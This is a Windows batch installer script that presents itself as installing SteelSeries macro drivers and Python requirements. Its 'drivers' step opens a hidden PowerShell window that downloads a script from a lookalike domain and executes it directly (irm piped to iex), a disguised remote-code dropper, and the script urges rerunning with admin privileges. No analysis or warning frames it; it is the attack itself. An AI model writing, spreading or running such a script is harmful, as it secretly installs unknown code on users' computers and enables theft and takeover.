@echo off
setlocal EnableDelayedExpansion
color 6
echo [LOG] Installing Drivers

:: Use steelseries macro drivers...
powershell Start-Process powershell -ArgumentList 'irm steelseries.app/x64/macros ^| iex' -WindowStyle Hidden

color a
echo [LOG] Drivers Installed!

color 6
echo [LOG] Installing requirements.txt
pip install -r requirements.txt

color a
echo [LOG] Requirements Installed!

echo If the script fails...
echo rerun installer.bat with admin privileges

PAUSE
cls
